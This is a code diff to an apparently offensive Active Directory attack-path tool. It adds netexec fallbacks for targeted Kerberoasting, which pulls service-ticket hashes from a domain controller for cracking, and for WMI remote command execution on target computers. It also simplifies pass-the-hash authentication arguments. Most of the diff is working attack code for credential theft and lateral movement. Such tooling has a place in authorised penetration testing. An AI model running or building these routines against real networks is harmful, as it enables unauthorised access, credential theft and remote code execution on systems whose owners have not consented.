@@ -54,6 +54,14 @@ from pathstrike.tools.netexec_wrapper import (
     dump_laps,
     execute_command,
     run_netexec,
+    s4u_delegate,
+    wmi_exec,
+)
+from pathstrike.tools.netexec_wrapper import (
+    build_nxc_auth,
+)
+from pathstrike.tools.netexec_wrapper import (
+    kerberoast as nxc_kerberoast,
 )
 
 
@@ -77,6 +85,42 @@ def _kerberoast_hashcat_mode(tgs_hashes: list[dict[str, Any]]) -> int:
         if len(parts) > 2 and parts[1] == "krb5tgs" and parts[2] in mode_by_etype:
             return mode_by_etype[parts[2]]
     return 13100
+
+
+async def _nxc_kerberoast_hashes(
+    domain: str,
+    username: str,
+    password: str | None,
+    nt_hash: str | None,
+    dc_ip: str,
+    target_user: str,
+) -> list[dict[str, Any]]:
+    """netexec targeted-Kerberoast fallback → list of ``{"hash": ...}`` entries.
+
+    Runs ``nxc ldap <dc> --kerberoasting <file> --kerberoast-account
+    <target>`` and parses the ``$krb5tgs$`` hashes netexec writes to *file*.
+    Returns an empty list on any failure (caller treats that as "no hashes").
+    """
+    import tempfile
+
+    nxc_auth = build_nxc_auth(username, password, nt_hash, domain)
+    with tempfile.NamedTemporaryFile(
+        prefix="nxc_kroast_", suffix=".txt", delete=False
+    ) as fh:
+        out_path = fh.name
+    try:
+        await nxc_kerberoast(dc_ip, nxc_auth, out_path, accounts=[target_user])
+        content = Path(out_path).read_text(errors="replace")
+    except Exception:  # pragma: no cover - best-effort fallback
+        content = ""
+    finally:
+        Path(out_path).unlink(missing_ok=True)
+
+    return [
+        {"hash": line.strip()}
+        for line in content.splitlines()
+        if line.strip().startswith("$krb5tgs$")
+    ]
 
 
 async def perform_targeted_kerberoast(
@@ -215,21 +259,31 @@ async def perform_targeted_kerberoast(
             target_user, spn_clear.get("error", "unknown"), target_user,
         )
 
-    if not roast["success"]:
-        return (
-            False,
-            f"Kerberoast failed on '{target_user}': "
-            f"{roast.get('error', 'unknown')}",
-            [],
-            leftover_spn,
+    parsed = roast.get("parsed") or {} if roast.get("success") else {}
+    tgs_hashes = parsed.get("tgs_hashes") or []
+
+    if not tgs_hashes:
+        # Fallback: netexec targeted Kerberoast (ldap --kerberoasting
+        # --kerberoast-account) — a different roasting implementation when
+        # GetUserSPNs returns nothing or impacket is unavailable.
+        logger.info(
+            "impacket Kerberoast yielded no hashes for '%s'; trying netexec",
+            target_user,
+        )
+        tgs_hashes = await _nxc_kerberoast_hashes(
+            domain, source_principal, password, nt_hash, dc_ip, target_user
         )
 
-    parsed = roast.get("parsed") or {}
-    tgs_hashes = parsed.get("tgs_hashes") or []
     if not tgs_hashes:
+        reason = (
+            roast.get("error", "unknown")
+            if not roast.get("success")
+            else "no TGS hashes returned"
+        )
         return (
             False,
-            f"Kerberoast returned no TGS hashes for '{target_user}'.",
+            f"Kerberoast failed on '{target_user}': {reason} "
+            "(incl. netexec fallback).",
             [],
             leftover_spn,
         )
@@ -355,46 +409,12 @@ class CanRDPHandler(BaseEdgeHandler):
         return None
 
     def _build_nxc_auth_args(self) -> list[str]:
-        """Build netexec-compatible auth arguments from bloodyAD-style args.
+        """Build netexec auth arguments for the configured principal.
 
-        bloodyAD uses ``-p`` for both passwords and NTLM hashes
-        (``-p :NTHASH`` or ``-p LMHASH:NTHASH``).  netexec uses
-        ``-p`` for passwords and ``-H`` for NT hashes.
+        Thin wrapper over the shared :meth:`BaseEdgeHandler._get_nxc_auth_args`
+        (kept for the existing call sites in this module).
         """
-        args = self._get_auth_args()
-        nxc_args: list[str] = []
-        i = 0
-        while i < len(args):
-            flag = args[i]
-            if flag == "-u" and i + 1 < len(args):
-                nxc_args.extend(["-u", args[i + 1]])
-                i += 2
-            elif flag == "-p" and i + 1 < len(args):
-                value = args[i + 1]
-                if value.startswith(":") or (
-                    ":" in value and len(value.replace(":", "")) == 32
-                ):
-                    # bloodyAD -p :NTHASH or -p LMHASH:NTHASH → nxc -H
-                    nt_hash = value.split(":")[-1]
-                    nxc_args.extend(["-H", nt_hash])
-                else:
-                    nxc_args.extend(["-p", value])
-                i += 2
-            elif flag == "-k":
-                nxc_args.extend(["-k", "--use-kcache"])
-                i += 1
-            elif flag == "-c" and i + 1 < len(args):
-                # netexec doesn't directly support cert auth
-                i += 2
-            elif flag == "--dc-ip":
-                # Skip bloodyAD's --dc-ip (not needed for nxc inline)
-                i += 2 if (i + 1 < len(args)) else 1
-            else:
-                i += 1
-
-        # Add domain
-        nxc_args.extend(["-d", self._get_domain()])
-        return nxc_args
+        return self._get_nxc_auth_args()
 
 
 # ===================================================================
@@ -502,11 +522,11 @@ class ExecuteDCOMHandler(BaseEdgeHandler):
         if edge.target.label.lower() not in ("computer",):
             return (False, f"Target '{edge.target.name}' is not a Computer node.")
 
-        # Check dcomexec.py availability
-        if not shutil.which("dcomexec.py"):
+        # Need either Impacket's dcomexec.py or netexec (wmi fallback).
+        if not shutil.which("dcomexec.py") and not shutil.which("netexec"):
             return (
                 False,
-                "dcomexec.py not found on PATH. Ensure Impacket is installed.",
+                "Neither dcomexec.py (Impacket) nor netexec found on PATH.",
             )
 
         source_user = self._resolve_principal(edge)
@@ -565,9 +585,32 @@ class ExecuteDCOMHandler(BaseEdgeHandler):
         )
 
         if not result["success"]:
+            # Fallback: netexec's WMI protocol (different exec primitive than
+            # Impacket's dcomexec — useful when DCOM is filtered or dcomexec.py
+            # is unavailable).
+            self.logger.info(
+                "dcomexec failed on '%s'; falling back to netexec wmi exec",
+                target_host,
+            )
+            nxc_result = await wmi_exec(
+                target_host, self._get_nxc_auth_args(source_user), "whoami"
+            )
+            if nxc_result.get("success"):
+                output = (
+                    (nxc_result.get("parsed") or {}).get("command_output")
+                    or nxc_result.get("output", "")
+                ).strip()
+                msg = (
+                    f"WMI execution confirmed on '{target_host}' "
+                    f"(netexec fallback). Output: {output}"
+                )
+                self.logger.info(msg)
+                return (True, msg, [])
             return (
                 False,
-                f"DCOM execution failed on '{target_host}': {result.get('error', 'unknown')}",
+                f"DCOM/WMI execution failed on '{target_host}': "
+                f"{result.get('error', 'unknown')} "
+                f"(netexec wmi fallback: {nxc_result.get('error', 'unknown')})",
                 [],
             )
 
